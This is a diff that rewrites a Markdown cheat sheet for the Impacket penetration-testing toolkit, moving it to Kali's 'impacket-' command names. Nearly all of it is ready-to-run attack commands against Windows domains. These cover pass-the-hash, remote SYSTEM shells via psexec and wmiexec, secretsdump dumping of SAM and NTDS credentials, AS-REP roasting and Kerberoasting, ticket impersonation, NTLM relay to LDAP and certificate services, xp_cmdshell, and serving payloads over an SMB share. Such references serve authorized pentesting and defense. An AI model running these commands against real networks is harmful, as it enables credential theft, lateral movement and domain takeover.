@@ -1,237 +1,261 @@
 # Impacket
 
 !!! tip "Tip"
-    Most Impacket tools follow `impacket-<toolname> domain/user:password@target` syntax. For pass-the-hash: `impacket-wmiexec -hashes :NTLMhash domain/user@target`. For Kerberos auth: add `-k -no-pass` and ensure `/etc/hosts` and your Kerberos config point to the DC.
+    On Kali, use the packaged wrappers: `impacket-secretsdump`, `impacket-wmiexec`, `impacket-GetUserSPNs`, etc. Upstream help may still show the original script name in the usage line, but the Kali binaries are `impacket-<tool>`.
 
 ---
 ## Core Syntax
 
 ```bash
-<tool>.py [domain/][user][:pass]@<target> [flags]
+impacket-<tool> [options] [[domain/]username[:password]@]<target>
 ```
 
-### Common patterns
-
-- `DOMAIN/username:password@target` — domain account
-- `username:password@target` — local account / no domain
-- `-no-pass` — empty password
-- `-hashes LM:NT` or `:NT` — pass-the-hash (supply NT hash)
-
----
-## Authentication Methods
-
-| Method | Syntax Example |
+| Auth | Pattern |
 | --- | --- |
-| Plaintext | `psexec.py 'CORP\admin:Passw0rd@10.10.10.10'` |
-| Hashes (PTH) | `secretsdump.py 'user@10.10.10.10' -hashes :aad3...:nt...` |
-| Kerberos | `GetUserSPNs.py 'CORP/enum:Pass' -request` (or use `-k` with existing ticket) |
-| No password / anonymous | `smbclient.py 'WORKGROUP/guest@10.10.10.10'` |
+| Domain password | `impacket-psexec 'CORP/<user>:<pass>@10.10.10.10'` |
+| Local password | `impacket-wmiexec '<user>:<pass>@10.10.10.10'` |
+| Pass-the-hash | `impacket-wmiexec -hashes :<ntlm-hash> 'CORP/<user>@10.10.10.10'` |
+| Kerberos ticket | `KRB5CCNAME=<user>.ccache impacket-psexec -k -no-pass 'CORP/<user>@dc01.corp.local'` |
+| AES key | `impacket-secretsdump -aesKey <aes256-key> 'CORP/<user>@dc01.corp.local'` |
+
+!!! warning "Watch out"
+    Kerberos mode needs names, not raw IPs. Put the DC/host FQDN in `/etc/hosts`, set `KRB5CCNAME` when using a ticket, and add `-dc-ip 10.10.10.10` when DNS is unreliable.
 
 ---
 ## SMB / File Ops
 
-### Enumerate Shares
+### Enumerate shares
 
 ```bash
-smbclient.py 'WORKGROUP/guest@10.10.10.10'
+impacket-smbclient 'CORP/<user>:<pass>@10.10.10.10'
 ```
-
-**Expected Output:**
 
 ```text
-[*] Querying shares on 10.10.10.10
-
-    ADMIN$
-
-    C$
-
-    Public
+# shares
+# use SYSVOL
+# ls
+# get Policies/{GUID}/Machine/Microsoft/Windows NT/SecEdit/GptTmpl.inf
+# exit
 ```
 
-### Download File
+### Run scripted SMB client commands
 
 ```bash
-smbclient.py 'CORP/alice:Passw0rd@10.10.10.10' -command 'get \Users\Public\loot.txt /tmp/loot.txt'
+printf 'shares\nuse C$\nget Users\\Public\\loot.txt loot.txt\nexit\n' > smb.cmds
+impacket-smbclient -inputfile smb.cmds 'CORP/<user>:<pass>@10.10.10.10'
 ```
 
-### Host Files (serve payloads)
+### Host files
 
 ```bash
-smbserver.py PWN /home/user/payloads
+impacket-smbserver PWN /home/user/payloads -smb2support
 
-# Target can copy: copy \10.10.14.2\PWN\payload.exe C:\Temp\payload.exe
+# Target: copy \\10.10.14.2\PWN\payload.exe C:\Temp\payload.exe
 ```
 
 ---
-## Remote Code Execution & Lateral Movement
+## Remote Execution
 
-### psexec (service-based, reliable, noisy)
+| Tool | Use | Notes |
+| --- | --- | --- |
+| `impacket-psexec` | Interactive shell as `SYSTEM` | Uploads/starts a temporary service; reliable and noisy. |
+| `impacket-smbexec` | Semi-interactive shell as `SYSTEM` | Service-based; useful when `psexec` is blocked. |
+| `impacket-wmiexec` | Semi-interactive shell as the supplied user | WMI/DCOM; no service creation, still creates process telemetry. |
+| `impacket-dcomexec` | Semi-interactive shell as the supplied user | DCOM object execution; try when WMI behavior is filtered. |
+| `impacket-atexec` | One-shot command as `SYSTEM` | Scheduled task execution; good for a single command. |
 
-```bash
-psexec.py 'CORP\Administrator:Passw0rd@10.10.10.10' cmd.exe
-```
-
-> Creates a temporary service on the target (Event ID 7045). Use for reliable interactive shells.
-
-### wmiexec (WMI, stealthier — no service creation)
-
-```bash
-wmiexec.py 'CORP\svc:Password@10.10.10.10'
-```
-
-### Alternate RPC-based execs
+### PSExec
 
 ```bash
-smbexec.py 'user:pass@10.10.10.10'
-
-atexec.py 'user:pass@10.10.10.10'
-
-dcomexec.py 'user:pass@10.10.10.10'
+impacket-psexec 'CORP/Administrator:Passw0rd@10.10.10.10'
+impacket-psexec -hashes :<ntlm-hash> 'CORP/Administrator@10.10.10.10'
+impacket-psexec 'CORP/Administrator:Passw0rd@10.10.10.10' 'whoami'
 ```
 
-> Try different exec methods if one fails — environments vary (DCOM, Task Scheduler, SMB).
+### WMIExec
+
+```bash
+impacket-wmiexec 'CORP/<user>:<pass>@10.10.10.10'
+impacket-wmiexec -hashes :<ntlm-hash> 'CORP/<user>@10.10.10.10'
+impacket-wmiexec -shell-type powershell 'CORP/<user>:<pass>@10.10.10.10'
+impacket-wmiexec 'CORP/<user>:<pass>@10.10.10.10' 'ipconfig /all'
+```
+
+### Alternate exec methods
+
+```bash
+impacket-smbexec 'CORP/Administrator:Passw0rd@10.10.10.10'
+impacket-atexec 'CORP/Administrator:Passw0rd@10.10.10.10' 'whoami'
+impacket-dcomexec 'CORP/Administrator:Passw0rd@10.10.10.10'
+```
 
 ---
-## Credential Harvesting & Dumping
+## Credential Dumping
 
-### secretsdump — remote or offline SAM/NTDS extraction
+### Remote and offline dumps
 
 ```bash
-# Remote dump with creds
+# Remote SAM/LSA/NTDS where permitted
 impacket-secretsdump 'CORP/Administrator:Passw0rd@10.10.10.10'
 
-# Pass-the-hash mode (LM:NT or :NT)
-impacket-secretsdump 'CORP/user@10.10.10.10' -hashes :0123456789abcdef0123456789abcdef
+# Pass-the-hash
+impacket-secretsdump -hashes :<ntlm-hash> 'CORP/Administrator@10.10.10.10'
 
-# DC-only dump (skip SAM/LSA — NTDS.dit via DRSUAPI, much faster on large domains)
-impacket-secretsdump -just-dc 'CORP/Administrator:Passw0rd@dc.example.com'
+# DC-only DRSUAPI dump
+impacket-secretsdump -just-dc 'CORP/Administrator:Passw0rd@dc01.corp.local'
 
-# Just domain NTLM hashes (no Kerberos keys)
-impacket-secretsdump -just-dc-ntlm 'CORP/Administrator:Passw0rd@dc.example.com'
+# Domain NTLM hashes only
+impacket-secretsdump -just-dc-ntlm 'CORP/Administrator:Passw0rd@dc01.corp.local'
 
-# From an offline NTDS.dit + SYSTEM hive (e.g., after diskshadow + robocopy /b)
-impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
+# Offline SAM/SYSTEM/SECURITY
+impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
+
+# Offline NTDS.dit
+impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
 ```
 
-**Output:** NTLM hashes, cached creds, and (when possible) LSA secrets suitable for offline cracking.
-
-### samrdump / netview — lightweight enumeration
+### Lightweight enumeration
 
 ```bash
-samrdump.py 'CORP\user:Pass@dc.corp.local'
-
-netview.py 'CORP\user:Pass@10.10.10.10'
+impacket-samrdump 'CORP/<user>:<pass>@dc01.corp.local'
+impacket-lookupsid 'CORP/<user>:<pass>@dc01.corp.local'
+impacket-lookupsid 'CORP/<user>:<pass>@dc01.corp.local' 4000
+impacket-netview -target 10.10.10.10 'CORP/<user>:<pass>'
 ```
 
 ---
-## Kerberos Attacks
+## Kerberos
 
-### GetNPUsers — AS-REP Roasting (no preauth)
-
-```bash
-GetNPUsers.py 'CORP\user:Pass' -no-pass
-```
-
-Finds accounts with `DONT_REQ_PREAUTH` and outputs hashes crackable offline (hashcat/john format).
-
-### GetUserSPNs — Kerberoasting (TGS requests)
+### AS-REP roasting
 
 ```bash
-GetUserSPNs.py 'CORP\user:Pass' -request -outputfile spns.txt
+# No credentials, with a user list
+impacket-GetNPUsers example.com/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass -request -format hashcat -outputfile asrep.hash
+
+# Valid domain credentials
+impacket-GetNPUsers example.com/<user>:'<pass>' -dc-ip 10.10.10.10 -request -format hashcat -outputfile asrep.hash
 ```
 
-Enumerates accounts with SPNs, requests service tickets (TGS), saves crackable blobs for offline brute-forcing.
+### Kerberoasting
 
-### Ticketer / Kerberos ticket ops (advanced)
+```bash
+impacket-GetUserSPNs example.com/<user>:'<pass>' -dc-ip 10.10.10.10 -request -outputfile tgs.hash
+impacket-GetUserSPNs -k -no-pass example.com/<user> -dc-ip 10.10.10.10 -request -outputfile tgs.hash
+```
 
-`ticketer.py` can craft TGT/TGS tickets in specific scenarios — use only when you understand Kerberos ticket internals.
+### Ticket ops
+
+```bash
+impacket-getTGT example.com/<user>:'<pass>' -dc-ip 10.10.10.10
+impacket-getTGT -hashes :<ntlm-hash> example.com/<user> -dc-ip 10.10.10.10
+impacket-getTGT -aesKey <aes256-key> example.com/<user> -dc-ip 10.10.10.10
+
+impacket-getST -spn cifs/dc01.example.com -impersonate Administrator example.com/<user>:'<pass>' -dc-ip 10.10.10.10
+impacket-ticketConverter ticket.kirbi ticket.ccache
+```
+
+`impacket-ticketer` can forge tickets in specific key-compromise scenarios. Do not run it from a copied snippet; verify the SID, key material, SPN, and PAC requirements first.
 
 ---
-## NTLM Relay & Responder Integration
+## NTLM Relay
 
-### ntlmrelayx — relay captured NTLM auth to target services
-
-```bash
-# Relay to an SMB host
-ntlmrelayx.py -t smb://10.10.10.100 --smb2support
-
-# Relay using targets file & execute module
-ntlmrelayx.py -tf targets.txt -smb2support --delegate-access
-```
-
-**Typical flow:** Run Responder/mitm6 to capture NTLM; run `ntlmrelayx` to relay to SMB/HTTP/MSSQL and obtain access.
-
----
-## Database & Other Protocols
-
-### mssqlclient — TDS / MSSQL interactive shell
+### Relay captured auth
 
 ```bash
-mssqlclient.py 'sa:Pass@10.10.10.10'
-
-# If xp_cmdshell is enabled and you have permissions, you can run OS commands from MSSQL.
+impacket-ntlmrelayx -t smb://10.10.10.100 -smb2support
+impacket-ntlmrelayx -tf targets.txt -smb2support -i
+impacket-ntlmrelayx -tf targets.txt -smb2support -c 'whoami'
 ```
 
-### lookupsid — translate SIDs to accounts & enumerate groups
+### LDAP relay primitives
 
 ```bash
-lookupsid.py 'CORP\user:Pass@dc.corp.local' S-1-5-21-...
+impacket-ntlmrelayx -t ldap://dc01.example.com -smb2support --dump-laps
+impacket-ntlmrelayx -t ldaps://dc01.example.com -smb2support --delegate-access
+impacket-ntlmrelayx -t http://ca.example.com/certsrv/certfnsh.asp -smb2support --adcs --template Machine
 ```
 
+!!! warning "Watch out"
+    Relay needs a target that does not require signing or channel binding for the protocol you are attacking. Generate target lists with NetExec, then feed full URLs such as `smb://host`, `ldap://dc`, or `http://ca/certsrv/` to `-t` or `-tf`.
+
 ---
-## Modules & Scripts You Should Know
+## MSSQL
 
 ```bash
-# High-value Impacket tools for CTFs/pentests:
-smbclient.py, smbserver.py, psexec.py, wmiexec.py,
-smbexec.py, atexec.py, dcomexec.py, secretsdump.py,
-GetNPUsers.py, GetUserSPNs.py, ntlmrelayx.py,
-mssqlclient.py, lookupsid.py, samrdump.py, netview.py,
-ticketer.py
+# SQL auth
+impacket-mssqlclient 'sa:Passw0rd@10.10.10.10'
+
+# Windows auth
+impacket-mssqlclient -windows-auth 'CORP/<user>:<pass>@10.10.10.10'
+
+# Non-standard port
+impacket-mssqlclient -port 14330 'sa:Passw0rd@10.10.10.10'
 ```
 
-- `smbclient`, `smbserver` — file ops & payload hosting
-- `psexec`, `wmiexec`, `smbexec` — lateral execution
-- `secretsdump`, `samrdump` — credential harvesting
-- `GetNPUsers`, `GetUserSPNs` — Kerberos offline cracking
-- `ntlmrelayx` — NTLM relay attacks with Responder/mitm6
+```sql
+enable_xp_cmdshell
+xp_cmdshell whoami
+```
 
 ---
-## Impacket Cheatsheet
-
-| Task | Command Example |
-| --- | --- |
-| Check SMB creds | `smbclient.py 'CORP\user:Pass@10.10.10.10'` |
-| List shares | `smbclient.py 'user:pass@10.10.10.10'` |
-| Download file | `smbclient.py 'user:pass@10.10.10.10' -command 'get \\C$\path file'` |
-| Host payload | `smbserver.py PWN /home/user/payloads` |
-| RCE (psexec) | `psexec.py 'CORP\Administrator:Pass@10.10.10.10' cmd.exe` |
-| RCE (wmiexec) | `wmiexec.py 'user:Pass@10.10.10.10'` |
-| Dump hashes | `secretsdump.py 'CORP\Administrator:Pass@10.10.10.10'` |
-| AS-REP roast | `GetNPUsers.py 'CORP\user:Pass' -no-pass` |
-| Kerberoast | `GetUserSPNs.py 'CORP\user:Pass' -request` |
-| NTLM relay | `ntlmrelayx.py -t smb://10.10.10.100 --smb2support` |
-| MSSQL shell | `mssqlclient.py 'sa:Pass@10.10.10.10'` |
-
----
-## Recommended Operator Workflow
+## High-Value Tools
 
 ```text
-[0] Known creds? Try them against SMB/WinRM.
- ↓
-[1] Enumerate shares & services (smbclient, netview).
- ↓
-[2] If creds valid → attempt wmiexec (stealth) then psexec (reliable).
- ↓
-[3] Dump credentials (secretsdump, samrdump).
- ↓
-[4] Domain enum → Kerberos (GetNPUsers/GetUserSPNs) → offline crack.
- ↓
-[5] Relay opportunities: run Responder/mitm6 → ntlmrelayx against targets.
- ↓
-[6] Horizontal/vertical pivot; collect artifacts.
- ↓
-[7] Cleanup & credential rotation.
+impacket-smbclient       SMB mini-shell
+impacket-smbserver       temporary SMB share
+impacket-psexec          service-based SYSTEM shell
+impacket-wmiexec         WMI/DCOM semi-interactive shell
+impacket-smbexec         service-based semi-interactive shell
+impacket-atexec          scheduled task command execution
+impacket-dcomexec        DCOM semi-interactive shell
+impacket-secretsdump     SAM/LSA/NTDS dumping
+impacket-samrdump        SAMR user enumeration
+impacket-lookupsid       SID/RID enumeration
+impacket-netview         host/session/share enumeration
+impacket-GetNPUsers      AS-REP roasting
+impacket-GetUserSPNs     Kerberoasting
+impacket-getTGT          request TGT
+impacket-getST           request service ticket / S4U flows
+impacket-ntlmrelayx      NTLM relay
+impacket-mssqlclient     MSSQL shell
 ```
 
-> After first access, collect for BloodHound and harvest token/delegation material; prioritize persistence only when necessary and within rules of engagement.
+---
+## Cheatsheet
+
+| Task | Command |
+| --- | --- |
+| SMB shell | `impacket-smbclient 'CORP/<user>:<pass>@10.10.10.10'` |
+| Host payloads | `impacket-smbserver PWN /home/user/payloads -smb2support` |
+| PSExec shell | `impacket-psexec 'CORP/Administrator:Passw0rd@10.10.10.10'` |
+| WMIExec shell | `impacket-wmiexec 'CORP/<user>:<pass>@10.10.10.10'` |
+| WMIExec command | `impacket-wmiexec 'CORP/<user>:<pass>@10.10.10.10' 'whoami'` |
+| Pass-the-hash shell | `impacket-wmiexec -hashes :<ntlm-hash> 'CORP/<user>@10.10.10.10'` |
+| Dump secrets | `impacket-secretsdump 'CORP/Administrator:Passw0rd@10.10.10.10'` |
+| Offline SAM dump | `impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL` |
+| AS-REP roast | `impacket-GetNPUsers example.com/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass -request -format hashcat -outputfile asrep.hash` |
+| Kerberoast | `impacket-GetUserSPNs example.com/<user>:'<pass>' -dc-ip 10.10.10.10 -request -outputfile tgs.hash` |
+| NTLM relay | `impacket-ntlmrelayx -tf targets.txt -smb2support -i` |
+| MSSQL shell | `impacket-mssqlclient -windows-auth 'CORP/<user>:<pass>@10.10.10.10'` |
+
+---
+## Operator Workflow
+
+```text
+[0] Validate creds with NetExec.
+ |
+[1] Use impacket-smbclient for quick share inspection.
+ |
+[2] If local admin: try impacket-wmiexec first, then impacket-psexec/smbexec/atexec.
+ |
+[3] Dump with impacket-secretsdump only when scope and privileges justify it.
+ |
+[4] Run impacket-GetNPUsers / impacket-GetUserSPNs for Kerberos roast paths.
+ |
+[5] Build relay targets with NetExec, then run impacket-ntlmrelayx.
+ |
+[6] Convert/request tickets as needed; keep hostnames and Kerberos config clean.
+```
+
+!!! note "From the lab"
+    Most failed Impacket Kerberos runs are name-resolution problems, not bad tickets. Use FQDN targets, set `KRB5CCNAME`, and add `-target-ip` or `-dc-ip` instead of swapping back to NTLM too early.
